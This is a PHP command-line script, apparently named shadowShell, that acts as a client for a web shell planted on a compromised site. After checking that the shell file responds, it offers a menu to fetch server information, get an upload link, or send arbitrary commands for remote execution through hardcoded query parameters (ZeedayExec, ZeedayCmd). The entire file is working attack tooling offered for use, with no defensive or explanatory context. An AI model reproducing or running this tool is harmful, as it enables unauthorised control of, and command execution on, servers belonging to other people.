<?php
error_reporting(0);
$url = $argv[1];
	
function curl($url){
	$ch = curl_init();
    curl_setopt($ch, CURLOPT_URL,$url."?Zeeday=MAKLO");
    $server_output = curl_exec ($ch);
    curl_close ($ch);
    return $server_output;
}
function curlexe($url,$cmd){
	$ch = curl_init();
    curl_setopt($ch, CURLOPT_URL,$url."?ZeedayExec=MAKLO&ZeedayCmd=$cmd");
    $server_output = curl_exec ($ch);
    curl_close ($ch);
    return $server_output;
}
function httpcode($url){
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch, CURLOPT_TIMEOUT, 15);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  curl_exec($ch);
  $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
  curl_close($ch);
  return $httpcode;
}
if(!$argv[1]){
	echo "USAGE: php shadowShell.php http://example.com/shadow.php\n";
	exit();
}
$bannr = "
 _____ _   _   ___ ______ _____  _    _   _____ _   _  _____ _      _     
/  ___| | | | / _ \|  _  \  _  || |  | | /  ___| | | ||  ___| |    | |    
\ `--.| |_| |/ /_\ \ | | | | | || |  | | \ `--.| |_| || |__ | |    | |    
 `--. \  _  ||  _  | | | | | | || |/\| |  `--. \  _  ||  __|| |    | |    
/\__/ / | | || | | | |/ /\ \_/ /\  /\  / /\__/ / | | || |___| |____| |____
\____/\_| |_/\_| |_/___/  \___/  \/  \/  \____/\_| |_/\____/\_____/\_____/
				83 72 65 68 79 87  83 72 69 76 76
";
if(httpcode($url) == 200){
	print("$bannr\n");
	print("============================================================\n");
	print("1.Server Info\n");
	print("2.Upload File\n");
	print("3.Command\n");
	print("============================================================\n");
	print("Pilihan: ");
	$no = trim(fgets(STDIN, 1024));
	if($no == "1"){
  	  curl($url);
	}elseif($no == "2"){
   		echo "Upload Access: $url?ZeedayUP=MAKLO";
	}elseif($no == "3"){
		echo "Command: ";
		$cmd = trim(fgets(STDIN, 1024));
		curlexe($url,$cmd);
		echo "\n";
	}
	else{
		echo "Error!\n";
	}
}else{
	echo "Sorry,We Can't Access Your File\n";
}
?>
